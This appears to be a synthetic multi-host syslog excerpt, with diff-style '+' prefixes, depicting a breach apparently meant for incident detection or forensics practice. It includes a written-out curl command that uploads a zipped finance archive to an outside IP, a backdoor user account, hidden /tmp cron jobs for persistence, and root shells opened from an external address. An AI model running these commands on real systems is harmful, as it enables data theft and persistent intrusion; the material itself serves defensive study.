+<134>Jun 10 09:20:11 fileserver01 sudo[6010]: pam_unix(sudo:session): session opened for user root by fileadmin(uid=0)
+<134>Jun 10 09:20:20 fileserver01 sudo[6020]: fileadmin : TTY=pts/0 ; PWD=/data/shares ; USER=root ; COMMAND=/usr/bin/find /data -name "*.xlsx"
+<134>Jun 10 09:20:30 fileserver01 sudo[6021]: fileadmin : TTY=pts/0 ; PWD=/data/shares ; USER=root ; COMMAND=/usr/bin/find /data -name "*.csv"
+<134>Jun 10 09:20:40 fileserver01 sudo[6022]: fileadmin : TTY=pts/0 ; PWD=/data/shares ; USER=root ; COMMAND=/usr/bin/zip -r /tmp/data_export.zip /data/shares/finance
+<134>Jun 10 09:21:00 fileserver01 sudo[6023]: fileadmin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -s -X POST https://91.92.251.103/upload -F file=@/tmp/data_export.zip
+<134>Jun 10 09:21:10 fileserver01 kernel: [15200.010] iptables: ACCEPT IN=eth0 OUT=eth1 SRC=10.0.0.40 DST=91.92.251.103 PROTO=TCP DPT=443
+<134>Jun 10 09:21:30 fileserver01 kernel: [15220.030] conntrack: [ASSURED] src=10.0.0.40 dst=91.92.251.103 sport=60010 dport=443 packets=18421 bytes=189724928
+<134>Jun 10 09:22:00 fileserver01 useradd[6030]: new user: name=svc_monitor, UID=1099, GID=1099, home=/home/svc_monitor, shell=/bin/bash
+<134>Jun 10 09:22:05 fileserver01 cron[6100]: (root) RELOAD (/etc/crontab)
+<134>Jun 10 09:22:10 fileserver01 cron[6101]: (root) CMD (/tmp/.svc_update > /dev/null 2>&1)
+<134>Jun 10 09:25:00 webserver01 nginx[1300]: 185.220.101.34 - - [10/Jun/2026:09:25:00 +0000] "GET /api/backup HTTP/1.1" 200 18204
+<134>Jun 10 09:25:30 webserver01 nginx[1300]: 185.220.101.34 - - [10/Jun/2026:09:25:30 +0000] "GET /api/backup HTTP/1.1" 200 45102
+<134>Jun 10 09:26:00 webserver01 kernel: [15300.001] iptables: ACCEPT IN=eth0 OUT=eth1 SRC=10.0.0.10 DST=91.92.251.103 PROTO=TCP DPT=443
+<134>Jun 10 09:26:30 webserver01 kernel: [15330.030] conntrack: [ASSURED] src=10.0.0.10 dst=91.92.251.103 sport=60020 dport=443 packets=12204 bytes=98432512
+<134>Jun 10 09:27:00 webserver01 cron[1410]: (root) RELOAD (/etc/crontab)
+<134>Jun 10 09:27:05 webserver01 cron[1411]: (root) CMD (/tmp/.update > /dev/null 2>&1)
+<134>Jun 10 09:30:00 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:09:30:00 +0000] "GET /products HTTP/1.1" 200 8820
+<134>Jun 10 09:30:30 dbserver01 mysqld[2001]: [Note] Access granted for user 'webapp'@'10.0.0.10' to database 'production'
+<134>Jun 10 09:31:00 appserver01 app-service[3200]: Processing request from 192.168.1.101
+<134>Jun 10 09:35:00 webserver01 sshd[1210]: Accepted publickey for jsmith from 192.168.1.100 port 52445 ssh2
+<134>Jun 10 09:35:05 webserver01 sshd[1210]: pam_unix(sshd:session): session opened for user jsmith by (uid=0)
+<134>Jun 10 09:35:10 webserver01 sudo[1211]: jsmith : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/bin/tail -f /var/log/auth.log
+<134>Jun 10 09:36:00 webserver01 sudo[1212]: jsmith : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/last
+<134>Jun 10 09:37:00 webserver01 sudo[1213]: jsmith : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/bin/netstat -an
+<134>Jun 10 09:38:00 dbserver01 kernel: [15600.001] conntrack: [ASSURED] src=10.0.0.20 dst=91.92.251.103 sport=60001 dport=443 packets=49821 bytes=512901120
+<134>Jun 10 09:40:00 webserver01 sshd[1215]: Accepted password for svc_monitor from 185.220.101.34 port 53001 ssh2
+<134>Jun 10 09:40:01 webserver01 sshd[1215]: pam_unix(sshd:session): session opened for user svc_monitor by (uid=0)
+<134>Jun 10 09:40:10 webserver01 sudo[1216]: svc_monitor : TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+<134>Jun 10 09:45:00 fileserver01 kernel: [15800.001] conntrack: [ASSURED] src=10.0.0.40 dst=91.92.251.103 sport=60010 dport=443 packets=38241 bytes=394338304
+<134>Jun 10 09:50:00 webserver01 nginx[1300]: 198.51.100.22 - - [10/Jun/2026:09:50:00 +0000] "GET /api/status HTTP/1.1" 200 112
+<134>Jun 10 09:55:00 dbserver01 cron[5130]: (root) CMD (/tmp/.svc_update > /dev/null 2>&1)
+<134>Jun 10 09:56:00 webserver01 cron[1430]: (root) CMD (/tmp/.update > /dev/null 2>&1)
+<134>Jun 10 10:00:00 fileserver01 sshd[6050]: Accepted password for svc_monitor from 185.220.101.34 port 54001 ssh2
+<134>Jun 10 10:00:01 fileserver01 sshd[6050]: pam_unix(sshd:session): session opened for user svc_monitor by (uid=0)
+<134>Jun 10 10:00:10 fileserver01 sudo[6060]: svc_monitor : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+<134>Jun 10 10:01:00 fileserver01 kernel: [16200.001] conntrack: [ASSURED] src=10.0.0.40 dst=91.92.251.103 sport=60011 dport=443 packets=58432 bytes=601534464
+<134>Jun 10 10:05:00 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:10:05:00 +0000] "GET /checkout HTTP/1.1" 200 4521
+<134>Jun 10 10:06:00 appserver01 sshd[3030]: Accepted publickey for mgreen from 192.168.1.101 port 49001 ssh2
+<134>Jun 10 10:06:10 appserver01 sshd[3030]: pam_unix(sshd:session): session opened for user mgreen by (uid=0)
+<134>Jun 10 10:10:00 dbserver01 mysqld[2001]: [Note] 214 queries/sec average
+<134>Jun 10 10:15:00 webserver01 sshd[1220]: Accepted password for svc_monitor from 185.220.101.34 port 55100 ssh2
+<134>Jun 10 10:15:01 webserver01 sshd[1220]: pam_unix(sshd:session): session opened for user svc_monitor by (uid=0)
+<134>Jun 10 10:16:00 webserver01 kernel: [16500.001] conntrack: [ASSURED] src=10.0.0.10 dst=91.92.251.103 sport=60021 dport=443 packets=68241 bytes=703414272
+<134>Jun 10 10:20:00 webserver01 cron[1440]: (root) CMD (/tmp/.update > /dev/null 2>&1)
+<134>Jun 10 10:25:00 dbserver01 sshd[5050]: Disconnected from user dbuser 10.0.0.10 port 45001
+<134>Jun 10 10:30:00 fileserver01 kernel: [16800.001] conntrack: [ASSURED] src=10.0.0.40 dst=91.92.251.103 sport=60011 dport=443 packets=82103 bytes=846450688
+<134>Jun 10 10:35:00 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:10:35:00 +0000] "GET /products HTTP/1.1" 200 8820
+<134>Jun 10 10:40:00 webserver01 cron[1450]: (root) CMD (/tmp/.update > /dev/null 2>&1)
+<134>Jun 10 10:45:00 dbserver01 cron[5140]: (root) CMD (/tmp/.svc_update > /dev/null 2>&1)
+<134>Jun 10 10:45:05 fileserver01 cron[6140]: (root) CMD (/tmp/.svc_update > /dev/null 2>&1)
+<134>Jun 10 10:50:00 appserver01 app-service[3300]: Processing 48 concurrent requests
+<134>Jun 10 10:55:00 fileserver01 kernel: [17200.001] conntrack: [ASSURED] src=10.0.0.40 dst=91.92.251.103 sport=60011 dport=443 packets=124503 bytes=1282691072
+<134>Jun 10 11:00:00 webserver01 cron[1460]: (root) CMD (/tmp/.update > /dev/null 2>&1)
+<134>Jun 10 11:00:01 dbserver01 cron[5150]: (root) CMD (/tmp/.svc_update > /dev/null 2>&1)
+<134>Jun 10 11:00:02 fileserver01 cron[6150]: (root) CMD (/tmp/.svc_update > /dev/null 2>&1)
+<134>Jun 10 11:05:00 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:11:05:00 +0000] "POST /api/checkout HTTP/1.1" 200 289
+<134>Jun 10 11:10:00 webserver01 nginx[1300]: 198.51.100.22 - - [10/Jun/2026:11:10:00 +0000] "GET /api/status HTTP/1.1" 200 112
+<134>Jun 10 11:15:00 fileserver01 kernel: [17600.001] conntrack: [ASSURED] src=10.0.0.40 dst=91.92.251.103 sport=60011 dport=443 packets=164823 bytes=1697636352
+<134>Jun 10 11:20:00 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:11:20:00 +0000] "GET /products HTTP/1.1" 200 8820
+<134>Jun 10 11:20:30 dbserver01 mysqld[2001]: [Note] Access granted for user 'webapp'@'10.0.0.10' to database 'production'
+<134>Jun 10 11:25:00 webserver01 cron[1470]: (root) CMD (/tmp/.update > /dev/null 2>&1)
+<134>Jun 10 11:30:00 webserver01 sshd[1230]: Accepted password for svc_monitor from 185.220.101.34 port 56001 ssh2
+<134>Jun 10 11:30:01 webserver01 sshd[1230]: pam_unix(sshd:session): session opened for user svc_monitor by (uid=0)
+<134>Jun 10 11:30:10 fileserver01 kernel: [18000.001] conntrack: [ASSURED] src=10.0.0.40 dst=91.92.251.103 sport=60011 dport=443 packets=208103 bytes=2144190464
+<134>Jun 10 11:35:00 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:11:35:00 +0000] "GET /api/health HTTP/1.1" 200 45
+<134>Jun 10 11:40:00 appserver01 sshd[3040]: Disconnected from user mgreen 192.168.1.101 port 49001
+<134>Jun 10 11:45:00 dbserver01 cron[5160]: (root) CMD (/tmp/.svc_update > /dev/null 2>&1)
+<134>Jun 10 11:50:00 webserver01 kernel: [18300.001] conntrack: [ASSURED] src=10.0.0.10 dst=91.92.251.103 sport=60021 dport=443 packets=98241 bytes=1011754496
+<134>Jun 10 11:55:00 fileserver01 sshd[6060]: Accepted password for svc_monitor from 185.220.101.34 port 57001 ssh2
+<134>Jun 10 11:55:01 fileserver01 sshd[6060]: pam_unix(sshd:session): session opened for user svc_monitor by (uid=0)
+<134>Jun 10 12:00:00 webserver01 cron[1480]: (root) CMD (/tmp/.update > /dev/null 2>&1)
+<134>Jun 10 12:00:01 dbserver01 cron[5170]: (root) CMD (/tmp/.svc_update > /dev/null 2>&1)
+<134>Jun 10 12:00:02 fileserver01 cron[6160]: (root) CMD (/tmp/.svc_update > /dev/null 2>&1)
+<134>Jun 10 12:05:00 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:12:05:00 +0000] "POST /api/checkout HTTP/1.1" 200 312
+<134>Jun 10 12:10:00 fileserver01 kernel: [18800.001] conntrack: [ASSURED] src=10.0.0.40 dst=91.92.251.103 sport=60012 dport=443 packets=248903 bytes=2562719744
+<134>Jun 10 12:15:00 webserver01 nginx[1300]: 198.51.100.22 - - [10/Jun/2026:12:15:00 +0000] "GET /api/status HTTP/1.1" 200 112
+<134>Jun 10 12:20:00 webserver01 nginx[1300]: 203.0.113.45 - - [10/Jun/2026:12:20:00 +0000] "GET /products HTTP/1.1" 200 8820
